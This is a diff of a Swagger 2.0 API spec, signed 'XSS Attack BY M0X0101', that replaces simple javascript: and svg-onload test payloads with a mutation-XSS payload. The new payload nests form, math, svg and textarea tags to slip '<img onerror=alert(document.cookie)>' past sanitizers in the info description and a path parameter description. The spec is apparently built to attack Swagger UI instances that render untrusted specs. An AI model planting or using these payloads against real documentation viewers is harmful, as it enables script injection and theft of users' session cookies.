@@ -1,17 +1,38 @@
-swagger: "2.0"
+swagger: '2.0'
 info:
-  title: "XSS Test"
-  # Try these alternate payloads:
-  x-logo:
-    url: "javascript:alert(1)"
-  contact:
-    url: "javascript:alert(document.domain)"
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /test:
+  /M0X0101:
     get:
-      summary: "Normal endpoint"
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
       parameters:
-        - name: "exploit"
-          in: query
-          description: "<svg/onload=alert(1)>"
-          type: string
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
